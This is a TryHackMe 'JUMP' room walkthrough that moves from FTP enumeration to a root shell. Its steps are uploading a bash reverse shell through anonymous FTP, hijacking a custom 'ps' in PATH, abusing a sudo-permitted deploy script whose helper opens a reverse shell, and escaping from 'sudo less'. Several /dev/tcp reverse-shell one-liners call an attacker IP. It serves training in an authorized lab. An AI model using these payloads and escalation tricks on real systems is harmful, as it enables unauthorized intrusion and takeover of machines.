# TryHackMe — JUMP

> **Platform:** TryHackMe  
> **Room:** JUMP  
> **Difficulty:** —  
> **Focus:** FTP enumeration, initial access, lateral movement, PATH hijacking, sudo abuse, and privilege escalation

---

## 1. Initial Enumeration

The first step was to perform a full TCP port scan with default scripts and service/version detection.

```bash
nmap -sC -sV -p- 10.48.142.131
```

### Nmap Results

| Port | Service | Version / Information |
|---|---|---|
| `21/tcp` | FTP | vsftpd 3.0.5 |
| `22/tcp` | SSH | OpenSSH 9.6p1 Ubuntu |

The important finding was on FTP:

```text
Anonymous FTP login allowed
incoming/   [writable]
pub/
```

This indicated that anonymous FTP access was enabled and that the `incoming/` directory was writable.

---

# 2. FTP Enumeration

Connect to the FTP service anonymously:

```bash
ftp 10.48.142.131
```

After enumerating the available files and directories, `README.txt` was found.

```bash
cat README.txt
```

Contents:

```text
[ recon pipeline ]

All recon jobs must be placed in incoming/.
Files are processed automatically on arrival.
Invalid formats are ignored.
```

### Key Observation

The README indicated that files placed inside `incoming/` are **automatically processed**.

This suggested that uploading a specially crafted executable/script could potentially trigger code execution.

---

# 3. Initial Access — Reverse Shell via FTP

A Bash reverse-shell script was created on the attacking machine.

```bash
nano rev.sh
```

Payload:

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.48.110.33/5555 0>&1
```

Make the script executable:

```bash
chmod +x rev.sh
```

Start a listener on the attacking machine:

```bash
nc -lvp 5555
```

Then upload the script through the anonymous FTP session:

```text
ftp> put rev.sh
```

The file appeared in the FTP directory:

```text
-rw-r--r--    1 115 123    55 Sep 05 05:19 rev.sh
```

Attempting to change its permissions through FTP failed:

```text
ftp> chmod +x rev.sh
550 Permission denied.
```

However, the uploaded file was processed automatically.

After waiting for the processing mechanism to execute the file, the listener received a connection:

```text
Connection received on ip-10-48-142-131.ap-south-1.compute.internal
```

A shell was obtained as:

```text
recon_user
```

---

# 4. Flag 1 — `recon_user`

Enumerating the home directory:

```bash
ls
```

Returned:

```text
flag.txt
shell.sh
```

Read the flag:

```bash
cat flag.txt
```

```text
THM{5a3f1c92-7b4e-4d91-8c2............}
```

---

# 5. Lateral Movement to `dev_user`

The next step was to enumerate the other users on the system.

```bash
cd /home
ls
```

Users included:

```text
dev_user
monitor_user
ops_user
recon_user
ubuntu
```

The `dev_user` home directory was accessible:

```bash
cd /home/dev_user
ls
```

It contained:

```text
flag.txt
```

Read it with:

```bash
cat flag.txt
```

Flag:

```text
THM{8d2b7a41-3f9c-4e55-b1a......}
```

---

# 6. Searching for Group-Owned Files

A search was performed for files belonging to the `monitor_user` group:

```bash
find / -type f -group monitor_user 2>/dev/null
```

Interesting results:

```text
/opt/app/deploy_helper.sh
/usr/local/bin/healthcheck
/var/log/monitor.log
```

These files were worth investigating because they were associated with another user's group and could potentially provide a path for privilege escalation.

---

# 7. PATH Hijacking — `dev_user` to `monitor_user`

The directory `/opt/dev/bin` was inspected:

```bash
ls -ld /opt/dev/bin
```

Result:

```text
drwxr-xr-x 2 dev_user dev_user 4096 Apr 26 18:19 /opt/dev/bin
```

Inside the directory:

```bash
cd /opt/dev/bin
ls
```

There was a file named:

```text
ps
```

Running it showed process information:

```bash
ps
```

### Why `ps` Was Interesting

A command named `ps` existed in a custom directory.

Because custom executable directories can take precedence over system directories when they appear earlier in `$PATH`, a writable directory containing a fake `ps` can potentially result in **PATH hijacking**.

A malicious replacement was created:

```bash
printf '%s\n' \
'#!/bin/bash' \
'setsid bash -i >& /dev/tcp/10.49.98.209/5557 0>&1' \
> /opt/dev/bin/ps
```

Verify the file:

```bash
cat /opt/dev/bin/ps
```

Output:

```bash
#!/bin/bash
setsid bash -i >& /dev/tcp/10.49.98.209/5557 0>&1
```

Make it executable:

```bash
chmod +x /opt/dev/bin/ps
```

On the attacking machine, start a listener:

```bash
nc -lvnp 5557
```

When the vulnerable process executed `ps`, the malicious version was executed instead.

The listener received a connection:

```text
Connection received on 10.49.155.10
```

The new shell was:

```text
monitor_user@tryhackme-2404
```

---

# 8. Flag 3 — `monitor_user`

Move to the `monitor_user` home directory:

```bash
cd /home/monitor_user
ls
```

The directory contained:

```text
flag.txt
```

Read it:

```bash
cat flag.txt
```

Flag:

```text
THM{c1e9a7b3-2d44-4a88-9f7e-3b6.......}
```

Verify the current user:

```bash
whoami
id
```

Result:

```text
monitor_user
```

---

# 9. Sudo Enumeration

Check the commands available through `sudo`:

```bash
sudo -l
```

The important entry was:

```text
User monitor_user may run the following commands:
    (ops_user) NOPASSWD: /usr/local/bin/deploy.sh
```

This means `monitor_user` could execute `/usr/local/bin/deploy.sh` as `ops_user` without entering a password.

---

# 10. Inspecting `deploy.sh`

Locate the script:

```bash
cd /usr/local/bin
ls
```

Files included:

```text
deploy.sh
healthcheck
```

Read the deployment script:

```bash
cat deploy.sh
```

Contents:

```bash
#!/bin/bash
cd /opt/app 2>/dev/null
./deploy_helper.sh
```

The script changes into `/opt/app` and executes:

```text
./deploy_helper.sh
```

Inspect the helper:

```bash
cat /opt/app/deploy_helper.sh
```

Contents:

```bash
#!/bin/bash
echo "[+] Deploy helper running"
#echo "[+] Syncing application files"
#sleep 2
bash -i >& /dev/tcp/10.49.98.209/5560 0>&1
```

The helper contained a reverse-shell command.

---

# 11. Lateral Movement — `monitor_user` to `ops_user`

Start a listener on the attacking machine:

```bash
nc -lvnp 5560
```

Execute the permitted deployment script as `ops_user`:

```bash
sudo -u ops_user /usr/local/bin/deploy.sh
```

The helper executed and the listener received a connection:

```text
Connection received on 10.49.155.10
```

The resulting shell was:

```text
ops_user@tryhackme-2404:/opt/app$
```

We had successfully moved from:

```text
recon_user
    ↓
dev_user
    ↓
monitor_user
    ↓
ops_user
```

---

# 12. Flag — `ops_user`

The `ops_user` home directory contains the next flag.

```bash
cd /home/ops_user
ls
cat flag.txt
```

> **Note:** The original notes did not include the `ops_user` flag value, so it is intentionally not invented here.

---

# 13. Privilege Escalation — `ops_user` to `root`

Run:

```bash
sudo -l
```

The important result was:

```text
User ops_user may run the following commands on tryhackme-2404:
    (root) NOPASSWD: /usr/bin/less
```

This means `ops_user` can run `less` as `root` without a password.

---

# 14. Exploiting `less`

`less` can provide command execution through its interactive interface.

Run:

```bash
sudo less /etc/hosts
```

Inside `less`, execute:

```text
!/bin/sh
```

This launches a shell from the `less` process.

Verify privileges:

```bash
id
whoami
```

Output:

```text
uid=0(root) gid=0(root) groups=0(root)
```

And:

```text
root
```

We now have a root shell.

---

# 15. Root Flag

Move to the root home directory:

```bash
cd /root
ls
```

The directory contained:

```text
flag.txt
snap
```

Read the final flag:

```bash
cat /root/flag.txt
```

```text
THM{2b8e6c4a-1d55-4f90-a3c7-5e9d.........}
```

---

# Attack Path Summary

```text
                     ┌─────────────────────┐
                     │  Target Enumeration │
                     │   Nmap 21, 22       │
                     └──────────┬──────────┘
                                │
                                ▼
                     ┌─────────────────────┐
                     │ Anonymous FTP       │
                     │ Writable incoming/  │
                     └──────────┬──────────┘
                                │
                                ▼
                     ┌─────────────────────┐
                     │ File Processing     │
                     │ Reverse Shell       │
                     └──────────┬──────────┘
                                │
                                ▼
                         recon_user
                                │
                                ▼
                     ┌─────────────────────┐
                     │ PATH Hijacking      │
                     │ /opt/dev/bin/ps     │
                     └──────────┬──────────┘
                                │
                                ▼
                         monitor_user
                                │
                                ▼
                     ┌─────────────────────┐
                     │ sudo deploy.sh      │
                     │ → deploy_helper.sh  │
                     └──────────┬──────────┘
                                │
                                ▼
                           ops_user
                                │
                                ▼
                     ┌─────────────────────┐
                     │ sudo less           │
                     │ Shell escape        │
                     └──────────┬──────────┘
                                │
                                ▼
                              root
```

---

# Key Techniques Learned

## 1. Service Enumeration

```bash
nmap -sC -sV -p- <TARGET>
```

Used to identify open ports, services, versions, and useful NSE enumeration results.

## 2. Anonymous FTP Enumeration

Anonymous FTP access can expose files and writable directories that may lead to initial access.

Important checks include:

```text
anonymous login
directory permissions
readable files
writable directories
configuration files
README/instruction files
```

## 3. Automated File Processing

A writable upload directory combined with automatic processing can create a code-execution opportunity if uploaded files are executed unsafely.

## 4. PATH Hijacking

If a privileged process invokes a command without using an absolute path, a malicious executable with the same name may be executed first when its directory appears earlier in `$PATH`.

Example:

```text
/opt/dev/bin/ps
```

instead of the legitimate system `ps`.

## 5. Sudo Enumeration

Always check:

```bash
sudo -l
```

Pay attention to:

```text
NOPASSWD
commands executable as another user
commands executable as root
```

## 6. Abusing `less`

If `less` is allowed through `sudo` as root, its shell escape can potentially be used to obtain a root shell:

```text
!/bin/sh
```

---

# Lessons Learned

- Always perform full-port enumeration rather than scanning only common ports.
- Anonymous FTP should immediately be checked for readable and writable content.
- Files such as `README.txt` can reveal how an application processes uploaded data.
- Writable directories containing commonly executed commands are worth investigating for PATH hijacking.
- `sudo -l` should be part of routine local enumeration.
- Scripts executed through `sudo` should be inspected for unsafe dependencies and writable files.
- Interactive programs such as `less` may expose shell-escape functionality when executed with elevated privileges.

---

## Disclaimer

This write-up documents techniques used against the intentionally vulnerable **TryHackMe JUMP room** in an authorized training environment.

Do not apply these techniques to systems without explicit authorization.
